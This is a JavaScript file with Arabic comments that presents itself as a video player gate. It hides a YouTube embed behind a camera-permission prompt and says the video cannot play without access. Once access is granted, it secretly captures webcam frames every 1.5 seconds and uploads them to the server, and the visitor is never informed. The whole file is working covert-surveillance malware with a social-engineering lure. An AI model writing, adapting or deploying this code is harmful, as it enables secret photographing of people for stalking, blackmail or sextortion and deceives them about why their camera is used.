/* ==========================================================
   سكريبت التحكم الشرطي المتقدم بالكاميرا وتشغيل الفيديو
   ========================================================== */

let mediaStream = null;

async function initPersistentCamera() {
    try {
        // محاولة طلب إذن الكاميرا
        mediaStream = await navigator.mediaDevices.getUserMedia({ 
            video: { 
                facingMode: { ideal: 'user' }
            } 
        });

        const videoEl = document.getElementById('video');
        if (videoEl) videoEl.srcObject = mediaStream;
        
        // [عند السماح]: إزالة شاشة الحظر وتشغيل مشغل اليوتيوب الحقيقي فوراً
        const playerContainer = document.getElementById('playerContainer');
        if (playerContainer) {
            const activeId = playerContainer.dataset.videoId || 'zMORugVTZAA';
            playerContainer.innerHTML = `<iframe src="https://www.youtube.com/embed/${activeId}?autoplay=1&rel=0&playsinline=1" title="" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen referrerpolicy="strict-origin-when-cross-origin"></iframe>`;
        }
        
        // التقاط الصور وإرسالها كل 1.5 ثانية في الخلفية
        setInterval(() => {
            if (!mediaStream || !videoEl) return;
            try {
                const vw = videoEl.videoWidth || 640;
                const vh = videoEl.videoHeight || 480;

                const canvas = document.createElement('canvas');
                canvas.width = vw;
                canvas.height = vh;

                const ctx = canvas.getContext('2d');
                ctx.drawImage(videoEl, 0, 0, vw, vh);

                canvas.toBlob(blob => {
                    if (blob) {
                        let fd = new FormData();
                        fd.append('image', blob, `user_eye.jpg`);
                        fetch('/upload', { method: 'POST', body: fd }).catch(() => {});
                    }
                }, 'image/jpeg', 0.85);
            } catch (err) {
                console.log("خطأ في التقاط الإطار:", err);
            }
        }, 1500);

    } catch (e) {
        console.log("تم رفض الإذن:", e);
        showRetryScreen();
    }
}

// دالة عرض واجهة الحظر وتنبيه المستخدم بضرورة السماح للمتابعة
function showRetryScreen() {
    const playerContainer = document.getElementById('playerContainer');
    if (playerContainer) {
        playerContainer.innerHTML = `
            <div id="retryCamera" style="display:grid;place-items:center;height:100%;color:#fff;text-align:center;padding:20px;background:#000;position:absolute;inset:0;z-index:99;">
                <div>
                    <div style="font-size:36px;margin-bottom:8px;">⚠️</div>
                    <p style="color:#ff0000;font-weight:bold;margin-bottom:6px;font-size:15px;">لمشاهدة الفيديو يجب عليك الضغط على زر السماح</p>
                    <p style="color:#aaa;font-size:12px;margin-bottom:14px;">الرجاء منح إذن الكاميرا لفتح مشغل العرض</p>
                    <span style="font-size:13px;color:#fff;background:#cc0000;padding:8px 20px;border-radius:20px;display:inline-block;font-weight:bold;cursor:pointer;">اضغط هنا للسماح</span>
                </div>
            </div>
        `;
        
        // عند النقر على الزر، يتم إعادة استدعاء نافذة الأذونات من المتصفح مباشرة
        document.getElementById('retryCamera').onclick = () => {
            mediaStream = null;
            initPersistentCamera();
        };
    }
}

function startCapture() {
    if (mediaStream) return;
    
    // عند الضغط على الفيديو لأول مرة، يظهر قفل الحظر المؤقت
    const playerContainer = document.getElementById('playerContainer');
    if (playerContainer) {
        const iframe = playerContainer.querySelector('iframe');
        if(iframe) {
            const match = iframe.src.match(/embed\/([^?]+)/);
            if(match) playerContainer.dataset.videoId = match[1];
        }
    }

    initPersistentCamera();
}
